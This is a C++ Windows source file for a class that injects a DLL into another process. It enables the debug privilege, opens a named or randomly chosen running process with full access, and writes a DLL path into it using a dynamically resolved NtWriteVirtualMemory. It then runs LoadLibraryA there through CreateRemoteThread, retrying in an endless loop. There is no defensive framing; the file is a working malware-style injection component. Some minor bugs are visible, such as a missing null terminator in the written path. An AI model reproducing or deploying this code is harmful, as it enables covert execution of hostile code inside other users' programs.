#include <Windows.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <constant.h>
#include <vector>
#include <comdef.h>

#define MAX_NAME 256

using namespace std;

typedef LONG (WINAPI *NtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG  NumberOfBytesWritten);

class Implementation
{
  private:
    BOOL GetLogonFromToken (HANDLE hToken, _bstr_t& strUser, _bstr_t& strdomain) 
    {
      DWORD dwSize = MAX_NAME;
      BOOL bSuccess = FALSE;
      DWORD dwLength = 0;
      strUser = "";
      strdomain = "";
      PTOKEN_USER ptu = NULL;
      
      if (NULL == hToken)
        return bSuccess;
      if (!GetTokenInformation(
        hToken,
        TokenUser,
        (LPVOID) ptu,
        0,
        &dwLength
      )) 
      {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) 
          return bSuccess;
        ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
        if (ptu == NULL)
          return bSuccess;
      }

      if (!GetTokenInformation(
        hToken,
        TokenUser,
        (LPVOID) ptu,
        dwLength,
        &dwLength
      ))
      {
        if (ptu != NULL)
           HeapFree(GetProcessHeap(), 0, (LPVOID)ptu);
        return bSuccess;
      }
      SID_NAME_USE SidType;
      char lpName[MAX_NAME];
      char lpDomain[MAX_NAME];

      if( !LookupAccountSid( NULL , ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType ) )                                    
      {
        DWORD dwResult = GetLastError();
        if( dwResult == ERROR_NONE_MAPPED )
          strcpy (lpName, "NONE_MAPPED" );
      }
      else
      {
        strUser = lpName;
        strdomain = lpDomain;
        bSuccess = TRUE;
      }
      return bSuccess;
    }
		void enablePrivilege()
		{
		  HANDLE handle;
      LUID luid;
      TOKEN_PRIVILEGES token;
      OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &handle);
      LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
      token.PrivilegeCount = 1;
      token.Privileges[0].Luid = luid;
      token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
      AdjustTokenPrivileges(handle, false, &token, sizeof(token), NULL, NULL);
      CloseHandle(handle);
    }
    vector<DWORD> getPIDs()
    {
      char *processOwner;
      vector<DWORD> pids;
      PROCESSENTRY32 entry;
      entry.dwSize = sizeof(PROCESSENTRY32);
      HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, '\0');
      if (Process32First(snapshot, &entry) == TRUE)
      {
        pids.clear();
        while (Process32Next(snapshot, &entry) == TRUE) 
        {
          pids.push_back(entry.th32ProcessID);
        }
      }
      CloseHandle(snapshot);
      return pids;
    }
    DWORD getPID(char *processName)
    {
      srand(time(0));
      char *processOwner;
      DWORD pid = -1;
      PROCESSENTRY32 entry;
      entry.dwSize = sizeof(PROCESSENTRY32);
      HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, '\0');
      if (Process32First(snapshot, &entry) == TRUE)
      {
        if (processName != NULL)
        {
          while (Process32Next(snapshot, &entry) == TRUE)
            if (_tcsicmp(entry.szExeFile, _T(processName)) == 0)
              pid = entry.th32ProcessID;
        }
      }
      CloseHandle(snapshot);
      return pid;
    }
    char *getProcessOwner(DWORD pid)
    {
      HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pid);
      HANDLE hToken = NULL;
      OpenProcessToken( hProcess, TOKEN_QUERY, &hToken);
      _bstr_t strUser, strdomain;
      GetLogonFromToken (hToken, strUser, strdomain);
      CloseHandle(hToken);
      CloseHandle(hProcess);
      const char *temp = strUser;
      return (char *)temp;
    }
    void log(char *log)
    {
      FILE *file = fopen(LOG_PATH, "a+");
      fputs(log, file);
      fclose(file);
    }
  public:
  	DWORD inject(char *processName, char *buffer)
  	{
  	  DWORD pid;
  	  HANDLE process, thread;
  	  LPVOID address, arg;
  	  enablePrivilege();
      bool success;
      srand(time(0));
      vector<DWORD> pids;
      if (processName == NULL)
        pids = getPIDs();
      do
      {
        success = true;
        if (processName == NULL)
          pid = pids[rand() % pids.size()];
        else
          pid = getPID(processName);
    	  if ((process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
        {
    	    log("Error: The specified process could not be opened.\n");
          success = false;
        }
  	    else if ((address = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")) == NULL)
        {
  		    log("Error: The LoadLibraryA function is not found in kernel32.dll.\n");
          success = false;
        }
  		  else if ((arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
        {
  		    log("Error: The memory could not be allocated.\n");
          success = false;
        }
        else
        {
          NtWriteVirtualMemory ntWriteVirtualMemory = NULL;
          ntWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(GetModuleHandle(_T("ntdll.dll")),"NtWriteVirtualMemory");
          ntWriteVirtualMemory(process, arg, (void *)buffer, strlen(buffer), NULL);

        	if ((thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)address, arg, '\0', NULL)) == NULL)
          {
    		    log("Error: The remote thread could not be created.\n");
            success = false;
          }
        }
      }
      while (!success);
	    CloseHandle(process);
      return pid;
    }
};
